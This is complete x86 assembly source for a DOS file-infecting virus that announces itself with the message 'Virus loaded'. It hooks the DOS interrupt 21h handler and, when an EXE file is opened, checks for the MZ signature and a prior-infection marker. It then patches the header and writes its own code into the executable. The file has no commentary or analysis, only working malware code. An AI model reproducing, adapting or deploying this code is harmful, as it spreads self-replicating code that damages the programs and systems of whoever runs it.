

	.286
	.radix	16
	assume	cs:gluk
gluk	segment
	org	100
start:	cli
	cld
	mov	ah,9
	mov	dx,offset tit
	int	21
	mov	ax,3521
	int	21
	push	es
	push	bx
	xor	ax,ax
	mov	es,ax
	mov	si,offset begin
	mov	di,200
	mov	cx,180
	rep	movsb
	mov	ds,ax
	pop	[di]
	pop	[di+2]
	mov	dx,200
	mov	ax,2521
	int	21
	ret

tit	db	'Virus loaded$'
	dw	0
	dw	0

begin:	cmp	ah,3dh
	jz	glk
	int	0e0
rt:	retf	[2]

glk:	mov	al,2
	int	0e0
	jc	rt
	pusha
	push	ds
	mov	bp,180
	mov	bx,ax
	mov	ah,3f
	push	cs
	pop	ds
	mov	cx,20
	mov	dx,384
	mov	si,dx
	int	0e0
	cmp	[si],'ZM'
	jnz	zhalko
	mov	di,1551
	cmp	[si+2],di
	jz	zhalko
	mov	[si+2],di
	mov	di,[si+18]
	mov	[si-8],di
	xor	ax,ax
	xchg	[si+6],ax
	mov	[si-6],ax
	mov	cx,ax
	mov	ax,[si+8]
	shl	cx,2
	add	cx,di
	mov	[si-0a],cx
	mov	di,10
	mul	di
	sub	ax,bp
	cmp	ax,cx
	jc	zhalko
	push	cx
	mov	ax,[si+8]
	add	ax,[si+16]
	mul	di
	add	ax,[si+14]
	adc	dl,0
	mov	cx,dx
	mov	dx,ax
	push	cx
	push	dx
	call	seekto
	mov	dx,500
	mov	cx,bp
	mov	ah,3f
	int	0e0
	pop	dx
	pop	cx
	call	seekto
	mov	cx,180
	mov	dx,200
	mov	ah,40
	int	0e0
	call	seekz
	mov	cl,20
	mov	ah,40
	mov	dx,si
	int	0e0
	pop	dx
	call	seek
	mov	cx,bp
	mov	ah,40
	mov	dx,500
	int	0e0

zhalko:	call	seekz
	pop	ds
	popa
	retf	[2]
seekz:	xor	dx,dx
seek:	xor	cx,cx
seekto:	mov	ax,4200
	int	0e0
	ret

gluk	ends
end	start

